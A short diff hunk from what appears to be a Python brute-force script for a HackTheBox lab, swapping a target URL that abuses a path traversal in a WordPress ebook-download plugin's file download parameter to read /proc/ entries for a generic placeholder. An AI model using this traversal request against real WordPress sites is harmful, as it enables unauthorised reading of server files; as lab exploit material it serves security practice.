@@ -14,7 +14,7 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 # Global variables
-main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"
+main_url = "http://[SERVER]/[path]/file.php?enum=/proc/"
 empty_resp = 125
 
 p1 = log.progress("Brute force")
